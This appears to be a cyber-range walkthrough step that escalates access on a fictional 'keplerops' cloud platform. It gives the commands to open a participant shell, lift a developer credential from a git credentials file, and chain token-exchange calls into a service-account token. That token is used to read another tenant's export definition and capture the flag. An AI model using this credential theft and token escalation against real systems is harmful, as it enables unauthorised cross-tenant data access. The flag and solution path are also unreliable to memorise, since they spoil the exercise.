# K15.2 Walkthrough: A job outside your account

Precondition: the K14.2 export SA token (`$EXPORT_TOKEN`).

## Step 0: open a participant shell

```
gcloud compute ssh <range-vm> --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Step 1: get the export SA token

```
CA=~/.local/share/keplerops/ca.crt
DEV=$(sed -E 's#https://([^@]+)@.*#\1#' ~/.config/git/credentials)
WORKLOAD=$(curl -sS --cacert $CA -u "$DEV" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/workspaces/current/token-exchange \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
EXPORT_TOKEN=$(curl -sS --cacert $CA -H "Authorization: Bearer $WORKLOAD" \
  -H 'Content-Type: application/json' -d '{}' \
  https://cloud-api.keplerops.test/api/token-exchange/fieldkest-export-access \
  | grep -o '"access_token":"[^"]*"' | cut -d'"' -f4)
```

## Step 2: read the export definition (K15.2 acceptance check)

```
curl -sS --cacert $CA -H "Authorization: Bearer $EXPORT_TOKEN" \
  https://cloud-api.keplerops.test/api/exports/EXP-2841/definition
```

```json
{"export_id":"EXP-2841","flag":"FLAG{bd60dc9d170bc2c7}","owner":"maya.ranscombe","partition_bindings":[{"connector_revision":"FLK-7.4.2","current":true,"partition":"PART-ARWC-01","revision":6,"tenant":"TEN-ARWC-019"}],"tenant":"TEN-ARWC-019"}
```

`partition=PART-ARWC-01` (K15.4).
